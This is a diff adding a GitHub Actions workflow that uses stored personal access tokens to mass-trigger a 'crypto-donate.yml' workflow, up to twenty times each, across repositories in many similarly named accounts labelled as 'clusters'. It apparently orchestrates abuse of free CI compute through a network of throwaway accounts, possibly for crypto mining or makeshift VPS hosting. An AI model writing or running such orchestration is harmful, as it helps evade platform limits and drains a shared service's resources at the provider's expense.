@@ -1,0 +1,66 @@
+name: Mass-Dispatch-All-Clusters
+on:
+  workflow_dispatch:
+    inputs:
+      nodes_per_cluster:
+        description: 'How many nodes to launch per cluster (1-20)'
+        required: true
+        default: '10'
+
+jobs:
+  dispatch:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - name: Mother-Cluster
+            token_secret: MOTHER_PAT
+            target: "asrarkhann116-ops/Xploit-hub-vps"
+          # - name: Cluster-3
+          #   token_secret: CLUSTER_3_PAT
+          #   target: "asrarkhann125-cloud/Xploit-hub-vps"
+          - name: Cluster-4
+            token_secret: CLUSTER_4_PAT
+            target: "asrarkhann127-glitch/Xploit-hub-vps"
+          - name: Cluster-5
+            token_secret: CLUSTER_5_PAT
+            target: "raufs6801-maker/Bro-vpes"
+          - name: Cluster-6
+            token_secret: CLUSTER_6_PAT
+            target: "asrarkhann120-hue/Xploit-hub-vps"
+          - name: Cluster-7
+            token_secret: CLUSTER_7_PAT
+            target: "asrarkhann128-png/Xploit-hub-vps"
+          - name: Cluster-8
+            token_secret: CLUSTER_8_PAT
+            target: "asrarkhann124-boop/Xploit-hub-vps"
+          - name: Cluster-9
+            token_secret: CLUSTER_9_PAT
+            target: "asrarkhann132-afk/maybe-we-need-deployment"
+          # - name: Cluster-10 (Suspended)
+          #   token_secret: CLUSTER_10_PAT
+          #   target: "asrarkhann114-hash/literate-engine"
+          - name: Cluster-11
+            token_secret: CLUSTER_11_PAT
+            target: "asrarkhann135-sudo/fictional-barnacle"
+    steps:
+      - name: Trigger nodes on ${{ matrix.name }}
+        env:
+          CLUSTER_PAT: ${{ secrets[matrix.token_secret] }}
+          TARGET: ${{ matrix.target }}
+          NODES: ${{ github.event.inputs.nodes_per_cluster }}
+        run: |
+          if [ -z "$CLUSTER_PAT" ]; then
+            echo "⚠️ No PAT for ${{ matrix.name }}, skipping..."
+            exit 0
+          fi
+          echo "🚀 Dispatching $NODES nodes to ${{ matrix.name }} ($TARGET)..."
+          for i in $(seq 1 $NODES); do
+            curl -s -X POST "https://api.github.com/repos/$TARGET/actions/workflows/crypto-donate.yml/dispatches" \
+              -H "Authorization: token $CLUSTER_PAT" \
+              -H "Accept: application/vnd.github.v3+json" \
+              -d '{"ref":"main","inputs":{"user_id":"admin","user_name":"cluster-node","duration":"360"}}'
+            sleep 1
+          done
+          echo "✅ Dispatched to ${{ matrix.name }} successfully!"
